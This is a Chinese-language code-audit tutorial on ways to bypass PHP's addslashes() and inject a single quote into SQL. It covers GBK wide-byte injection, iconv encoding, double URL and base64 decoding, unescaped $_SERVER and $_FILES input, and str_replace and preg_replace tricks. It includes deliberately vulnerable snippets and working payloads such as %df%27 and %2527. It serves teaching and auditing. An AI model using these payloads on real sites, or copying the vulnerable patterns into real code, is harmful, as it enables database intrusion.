本文主要分析绕过addslashes()引入单引号的一些情况，包括绕过引入单引号和总结一些addslashes不处理的情况,网上有很多总结好的，我自己整理了一下，加了一些自己的观点。

1

函数原型及说明

 

stringaddslashes ( string $str )在一些特殊字符【单引号（’）、双引号（”）、反斜线（\\）与 NUL（NULL 字符）】前加上反斜线并返回字符串。返回的值是转义后的字符串。

2

函数风险及原理

 

1.人为习惯

大概分为两种情况，第一种情况是当GPC关闭时，模拟GPC，第二种情况是在数据库语句中变量没有使用单引号包围，导致不用输入单引号即可以注入

第一种情况：

GPC在php6后已经移除了，所以很多程序员习惯用addslashes()来模拟GPC达到过滤函数的目的，但是由于处理时考虑不完善会导致一些安全问题，比如只对数组的内容进行过滤处理，从而忽视了对键值的处理，导致绕过。

这个问题曾出现在ecshop中

审计实例：

文件includes/init.php判断get\_magic\_quotes\_gpc(),如果为off则调用addslashes\_deep():

PHP

\[PHP\]

// includes/init.php

if (!get\_magic\_quotes\_gpc())

{

    if (!empty($\_GET))

    {

        $\_GET  = addslashes\_deep($\_GET);

    }

    if (!empty($\_POST))

    {

        $\_POST = addslashes\_deep($\_POST);

    }

  

    $\_COOKIE   = addslashes\_deep($\_COOKIE);

    $\_REQUEST  = addslashes\_deep($\_REQUEST);

}

addslashes\_deep()在文件includes/lib\_base.php里最后通过addslashes()处理

  

PHP

\[PHP\]

// includes/lib\_base.php

function addslashes\_deep($value)

{

    if (empty($value))

    {

        return $value;

    }

    else

    {

        return is\_array($value) ? array\_map('addslashes\_deep', $value) : addslashes($value);

    // 只处理了数组的值:)

    }

}

2.函数的一些绕过情况

a)字符编码问题导致绕过

这个问题主要利用一些编码对转义的特殊字符进行编码，第一种情况是当数据库编码格式设置为GBK时，可以实现宽字节注入，第二种情况是使用了iconv()或mb\_convert\_encoding()进行编码绕过。

  

第一种情况：

\[PHP\] 

<?php

$link=mysql\_connect("localhost","root","root");

mysql\_query("SET NAMES 'gbk'");

mysql\_select\_db("test",$link);

$username=$\_REQUEST\['username'\];

$password=md5($\_REQUEST\['password'\]);

$sql="select \* from admin where name='".addslashes($username)."'";

echo $sql;

代码中通过set names gbk 把数据库编码设置为gbk，0xbf27本身不是一个有效的GBK字符，但经过  addslashes()  转换后变为0xbf5c27，前面的0xbf5c是个有效的GBK字符，所以0xbf5c27会被当作一个字符0xbf5c和一个单引号来处理，结果漏洞就触发了。

  

第二种情况：

这里所说的问题是在使用iconv()进行编码时，无论是utf8togbk还是gbktoutf8都会造成宽字节注入

  

utf8togbk:

\[PHP\] 

<?php

$username=addslashes($\_REQUEST\['username'\]);

$username=iconv('utf-8','gbk',$username);

$password=md5($\_REQUEST\['password'\]);

$sql="select \* from admin where name='".$username."'";

echo $sql;

?>

当访问http://127.0.0.1/test/1.php?user ... 6%27&password=1输出

\[SQL\] 

select \* from admin where name='admin錦''

原理：錦”这个字，它的utf-8编码是0xe98ca6，它的gbk编码是0xe55c。当我们的錦被iconv从utf-8转换成gbk后，变成了%e5%5c，而后面的’被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\\\\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。

gbktoutf8:

\[PHP\]

<?php

$username=addslashes($\_REQUEST\['username'\]);

$username=iconv('gbk','utf-8',$username);

$password=md5($\_REQUEST\['password'\]);

$sql="select count(\*) as num from admin where name='".$username."'";

echo $sql;

?>

当访问http://127.0.0.1/test/1.php?username=admin%df%27输出

\[SQL\]

select \* from admin where name='admin運''

b)字符解码导致的绕过

这个问题分为url解码、base64解码、json解码等等

url解码：

  

在addslashes()之后又进行了一次urldecode() ，因为浏览器在处理url时会默认urldecode一次，如果在人为的urldecode一次的话（二次urldecode），当我们输入了二次编码的参数时(如%2527)，浏览器自动urldecode一次，经过addslashes的结果便是%27，没有出发addslashes的关键字，所以不对此进行转义，之后又引入一次urldecode，从而将%27解码为单引号（’），造成注入。

\[PHP\]

<?php

$username=addslashes($\_REQUEST\['username'\]);

$username=urldecode($username);

$sql="select \* from admin where name='".$username."'";

echo $sql;

?>

访问http://127.0.0.1/test/1.php?username=admin%2527输出

\[SQL\] 

select \* from admin where name='admin''

base64解码：

一些程序员喜欢使用base64编码传递参数

\[PHP\] 

<?php

$username=addslashes($\_REQUEST\['username'\]);

$username=base64\_decode($username);

$sql="select \* from admin where name='".$username."'";

echo $sql;

?>

当访问http://127.0.0.1/test/1.php?username=YWRtaW4n时输出

\[SQL\] 

select \* from admin where name='admin''

YWRtaW4n是admin’的base64编码

  
3.其他一些addslashes不处理的情况

a) $\_SERVER

$SERVER用来获取服务器和执行环境信息，如果我们能控制$\_SERVER的内容，那么就可能引入一个单引号。

根据之前记录的文章，我找到了$\_SERVER中的几个可控的地方，分别用审计实例演示一下：$\_SERVER\[‘SERVER\_NAME‘\]、 $\_SERVER\[‘HTTP\_X\_FORWARDED\_FOR’\]、$\_SERVER\[‘PHP\_SELF’\]、$\_SERVER\[“HTTP\_USER\_AGENT”\]

b) $\_FILES

$\_FILES出现注入的情况应该是开发忽视的一个问题，在代码中只过滤了post和get方式，忽略了$\_FILES，在上传时把文件名写入数据库，从而导致注入                                          

c) str\_replace

\[PHP\]

<?php 

$test=str\_replace($\_GET\['a'\],'',$\_GET\['b'\]); 

echo $test; ?>

test.php?a=&b=%00′  =>\\0\\’

test.php?a=0&b=%00′  =>\\\\’ 成功使用反斜杠注释掉GPC添加的反斜杠，从而引入单引号。这个问题曾发生在echop的支付模块中

d)preg\_replace

\[PHP\]

<?php

$test=0; 

extract($\_GET); 

$test=preg\_replace("/^(.\*)(')/", "\\\\1\\\\\\\\'", $test); 

echo $test;

?>

当提交

http://127.0.0.1/test/test.php?test=1%27     =>1\\’

http://127.0.0.1/test/test.php?test=1%0d%0a%27 =>1′

原理是该正则过滤只是把匹配到的关键字进行过滤，如果匹配不到那么就无法过滤。利用%0d%0a可绕过正则
